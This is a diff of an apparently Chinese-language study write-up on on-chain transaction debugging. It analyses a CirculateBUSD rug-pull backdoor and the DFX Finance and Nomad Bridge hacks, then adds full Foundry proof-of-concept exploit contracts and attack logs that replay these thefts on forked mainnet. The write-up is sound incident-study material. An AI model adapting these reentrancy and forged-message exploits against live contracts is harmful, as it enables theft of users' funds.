@@ -1,4 +1,6 @@
-On Chain Transaction Debugging
+链上交易分析
+
+PS：本文章参考了Github上的DeFiHackLabs相关文章，写的很好，表示感谢。
 
 # 1. Warm Up
 
@@ -352,4 +354,316 @@ interface IBOT {
 ```
 
 <hr />
+
+# 4. RugPull Analysisc
+
+主要分析的是`CirculateBUSD`项目的`RugPull`行为。Tx是`0x3475278b4264d4263309020060a1af28d7be02963feaf1a1e97e9830c68834b3`。但今天`phalcon`竟然先宕机了，没想到。
+
+观察调用栈，是在`startTrading`里又调用了`未开源合约`，逆向`decode`分析发现里面通过`if`区分开正常交易和`Rugpull`，属于留的后门！
+
+<hr />
+
+# 5. Reentrancy POC
+
+选用的攻击为发生在`ETH`链上的`DFX Finance`重入攻击，损失达到了400万美元。`tx Hash = 0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7`。 在`etherscan`里，跟踪`ERC20`的日志，可以得出如下结论：
+
+```
+1. 攻击合约从其他地址收到了大量通证
+2. DFX Finance 似乎收取了手续费
+3. 似乎进行了抵押、解压（有质押通证的铸造和销毁）
+```
+
+我们详细分析来看，进入`phalcon`
+
+查看调用栈：
+
+1. 攻击合约
+   1. dfx-xidr（受害者合约）.viewDeposit 查看存入20万通证所能需要的curve抵押
+   2. 闪电贷（中间向多签`0x27e843260c71443b4cc8cb6bf226c3f77b9695af`支付了手续费0.6%）
+   3. 在闪电贷回调函数中使用`deposit`进行了存入，对合约来说就相当于已经还款了
+   4. 在闪电贷结束后，进行`withdraw`
+
+写一个`POC`示例吧！
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../interface.sol";
+
+// @KeyInfo - Total Lost : ~ 4M US$
+// Event : DFX-Finance Hack
+// Analysis via https://explorer.phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
+// Attacker : 0x14c19962e4a899f29b3dd9ff52ebfb5e4cb9a067
+// Attack Contract : 0x6cFa86a352339E766FF1cA119c8C40824f41F22D
+// Vulnerable Contract : 0x46161158b1947D9149E066d6d31AF1283b2d377C (Curve Contract)
+// Attack Tx : https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
+
+// @Info
+// Reentrance Attack
+
+// @Analysis
+// DefiHackLab : https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/06_write_your_own_poc
+
+
+address constant TARGET_CURVE = 0x46161158b1947D9149E066d6d31AF1283b2d377C;
+address constant XIDR_ADDRESS =  0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52;
+address constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+address constant dfx_xidr_usdc_v2 = 0x46161158b1947D9149E066d6d31AF1283b2d377C;
+
+contract DFXFinanceHack is Test { // EOA Simulation
+
+    function setUp() public {
+        vm.createSelectFork("mainnet",15941700); // Go back before hacking time
+        console.log("start with block %d",15941700);
+    }
+
+    function testExploit() public {
+        console.log("start hacking...");
+        emit log_named_decimal_uint("[Start] Attacker XIDR Balance", IERC20(XIDR_ADDRESS).balanceOf(address(this)), 6);
+        emit log_named_decimal_uint("[Start] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 6);
+        Exploit exploit = new Exploit();
+        exploit.attack();
+        console.log("attacking finished");
+        emit log_named_decimal_uint("[End] Attacker XIDR Balance", IERC20(XIDR_ADDRESS).balanceOf(address(this)), 6);
+        emit log_named_decimal_uint("[End] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 6);
+    }
+
+}
+
+contract Exploit is Test {
+
+    IERC20 xidr = IERC20(XIDR_ADDRESS);
+    IERC20 usdc = IERC20(USDC_ADDRESS);
+    IERC20 dfx = IERC20(dfx_xidr_usdc_v2);
+    ICurve curve = ICurve(TARGET_CURVE);
+
+
+    address owner;
+
+    constructor() {
+        console.log("Exploit Created...");
+        owner = msg.sender;
+        initToken();
+    }
+
+    function initToken() public{
+        xidr.approve(address(curve),type(uint256).max);
+        usdc.approve(address(curve),type(uint256).max);
+        dfx.approve(address(curve),type(uint256).max);
+    }
+
+    function attack() public {
+        uint[] memory toDeposits = new uint[](2);
+
+        (, toDeposits) = curve.viewDeposit(200000 ether);
+        deal(address(xidr), address(this), toDeposits[0] * 8 / 1000);
+        deal(address(usdc), address(this), toDeposits[1] * 8 / 1000);
+        emit log_named_decimal_uint("[Init] To deposit 200000 us need xidr ", toDeposits[0], 6);
+        emit log_named_decimal_uint("[Init] To deposit 200000 us need usdc ", toDeposits[1], 6);
+        emit log_named_decimal_uint("[Init] Exploit USDC  Balance", usdc.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint("[Init] Exploit XIDR  Balance", xidr.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint("[Init] Exploit USDC  Balance", usdc.balanceOf(address(this)), 6);
+        
+        curve.flash(address(this), toDeposits[0] * 994 / 1000, toDeposits[1] * 994 / 1000, "1");
+        emit log_named_decimal_uint("[Flashed] Exploit Dfx  Balance", dfx.balanceOf(address(this)), 18);
+        curve.withdraw(dfx.balanceOf(address(this)),type(uint256).max);
+        emit log_named_decimal_uint("[Ended] Exploit XIDR  Balance", xidr.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint("[End] Exploit USDC  Balance", usdc.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint("[End] Exploit Dfx Balance", dfx.balanceOf(address(this)), 18);
+        xidr.transfer(owner,xidr.balanceOf(address(this)));
+        usdc.transfer(owner,usdc.balanceOf(address(this)));
+    }
+
+    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external{
+        emit log_named_decimal_uint("[Flashed] Exploit XIDR  Balance", xidr.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint("[Flashed] Exploit USDC  Balance", usdc.balanceOf(address(this)), 6);
+        curve.deposit(200000 ether, type(uint256).max);
+    }
+
+}
+/* -------------------- Interface -------------------- */
+interface ICurve {
+    function viewDeposit(uint256) external view returns (uint256, uint256[] memory);
+    function flash(address,uint256,uint256,bytes calldata) external;
+    function deposit(uint256,uint256) external;
+    function withdraw(uint256,uint256) external;    
+}
+```
+
+攻击日志如下：
+
+```
+Logs:
+  start with block 15941700
+  start hacking...
+  [Start] Attacker XIDR Balance: 0.000000
+  [Start] Attacker USDC Balance: 0.000000
+  Exploit Created...
+  [Init] To deposit 200000 us need xidr : 2325581395.325581
+  [Init] To deposit 200000 us need usdc : 100000.000000
+  [Init] Exploit USDC  Balance: 800.000000
+  [Init] Exploit XIDR  Balance: 18604651.162604
+  [Init] Exploit USDC  Balance: 800.000000
+  [Flashed] Exploit XIDR  Balance: 2330232558.116231
+  [Flashed] Exploit USDC  Balance: 100200.000000
+  [Flashed] Exploit Dfx  Balance: 387023.837944937241748062
+  [Ended] Exploit XIDR  Balance: 2287743564.832102
+  [End] Exploit USDC  Balance: 100066.263271
+  [End] Exploit Dfx Balance: 0.000000000000000000
+  attacking finished
+  [End] Attacker XIDR Balance: 2287743564.832102
+  [End] Attacker USDC Balance: 100066.263271
+```
+
+可以看出，在攻击前还需要手动转入通证，否则因为无法垫付税费，就会失败！
+
+<hr />
+
+# 6. Nomad Bridge Hack POC
+
+跨链现在一般采用以下原理：
+
+1. 消息交换（哈希）
+2. 锁定-铸造
+3. 基于信任 (CEX, Wrapped）
+4. 侧链
+
+Nomad项目跨链原理：
+
+```
+在Nomad项目中，利用叫做Replica的合约验证Merkle树结构中的消息， 这个合约在各个链上都有部署。项目中的其他合约都依靠这个合约验证输入的消息。一旦消息被验证，它就会被存储在Merkle树中，并生成一个新的承诺树根，并在随后确认、处理。
+```
+
+跨链验证智能合约`Replica`相关代码如下：
+
+```solidity
+   function process(bytes memory _message) public returns (bool _success) {
+       // ensure message was meant for this domain 这里应该使用了Lib
+       bytes29 _m = _message.ref(0);
+       require(_m.destination() == localDomain, "!destination");
+       // ensure message has been proven
+       bytes32 _messageHash = _m.keccak();
+       require(acceptableRoot(messages[_messageHash]), "!proven"); // 要求该根已被证明
+       // check re-entrancy guard
+       require(entered == 1, "!reentrant");
+       entered = 0; // 手动防止重入
+       // update message status as processed
+       messages[_messageHash] = LEGACY_STATUS_PROCESSED;
+       // call handle function
+       IMessageRecipient(_m.recipientAddress()).handle(
+           _m.origin(),
+           _m.nonce(),
+           _m.sender(),
+           _m.body().clone()
+       );
+       // emit process results
+       emit Process(_messageHash, true, "");
+       // reset re-entrancy guard
+       entered = 1;
+       // return true
+       return true;
+   }
+```
+
+看上去似乎没有问题，但是`Nomad`又升级了合约：
+
+```solidity
+function initialize(
+    uint32 _remoteDomain,
+    address _updater,
+    bytes32 _committedRoot,
+    uint256 _optimisticSeconds
+) public initializer {
+    __NomadBase_initialize(_updater);
+    // set storage variables
+    entered = 1;
+    remoteDomain = _remoteDomain;
+    committedRoot = _committedRoot;
+    // pre-approve the committed root.
+    confirmAt[_committedRoot] = 1;
+    _setOptimisticTimeout(_optimisticSeconds);
+}
+```
+
+在初始化tx（0x99662dacfb4b963479b159fc43c2b4d048562104fe154a4d0c2519ada72e50bf）中，传入的`committedRoot`为`0x0000000000000000000000000000000000000000000000000000000000000000`，所以当我们访问不存在的`messages[_messageHash]`后，`acceptableRoot`对零值的校验为真，因此就能通过。
+
+根据以上原理，可以编写攻击POC:
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../interface.sol";
+
+// @KeyInfo - Total Lost : ~ 190M US$
+// Event : Nomad Bridge Hack 
+// Analysis via https://explorer.phalcon.xyz/tx/eth/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460
+// Attacker : 0xa8c83b1b30291a3a1a118058b5445cc83041cd9d
+// Vulnerable Contract : 0x5d94309e5a0090b165fa4181519701637b6daeba (Proxy Contract)
+// Vulnerable Contract : 0xb92336759618f55bd0f8313bd843604592e27bd8 (Replica Contract)
+// Attack Tx : https://etherscan.io/tx/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460
+
+// @Info
+// Reentrance Attack
+
+// @Analysis
+// DefiHackLab : https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/07_Analysis_nomad_bridge/
+
+address constant TARGET_NOMAD = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
+address constant USDC_ADDRESS = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+
+address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;   
+address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
+uint32 constant ETHEREUM = 0x657468;   // "eth"
+uint32 constant MOONBEAM = 0x6265616d; // "beam"
+
+contract DFXFinanceHack is Test { // EOA Simulation
+
+    function setUp() public {
+        vm.createSelectFork("mainnet",15259100); // Go back before hacking time
+        console.log("start with block %d",15259100);
+    }
+
+    function testExploit() public {
+        console.log("start hacking...");
+        emit log_named_decimal_uint("[Start] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 6);
+
+        uint256 hackAmount = IERC20(USDC_ADDRESS).balanceOf(ERC20_BRIDGE);
+        emit log_named_decimal_uint("[Hacking] Victim USDC Balance", hackAmount, 6);
+
+        IBridge(TARGET_NOMAD).process(generateMsg(address(this),USDC_ADDRESS,hackAmount));
+
+        console.log("finish hacking...");
+        emit log_named_decimal_uint("[End] Victim USDC Balance", IERC20(USDC_ADDRESS).balanceOf(TARGET_NOMAD), 6);
+        emit log_named_decimal_uint("[End] Attacker USDC Balance", IERC20(USDC_ADDRESS).balanceOf(address(this)), 6);
+    }
+
+// 任意生成，只要hash不存在就行
+    function generateMsg(address to, address token, uint256 amount) internal returns(bytes memory){
+        return abi.encodePacked(
+           MOONBEAM,                           // Home chain domain
+           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
+           uint32(0),                          // Dst nonce
+           ETHEREUM,                           // Dst chain domain
+           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
+           ETHEREUM,                           // Token domain
+           uint256(uint160(token)),            // token id (e.g. WBTC)
+           uint8(0x3),                         // Type - transfer
+           uint256(uint160(to)),        // Recipient of the transfer
+           uint256(amount),                    // Amount
+           uint256(0)                          // Optional: Token details hash
+        );
+    }
+}
+
+
+/* -------------------- Interface -------------------- */
+interface IBridge {
+    function process(bytes memory _message) external returns (bool _success);
+}
+
+```
 
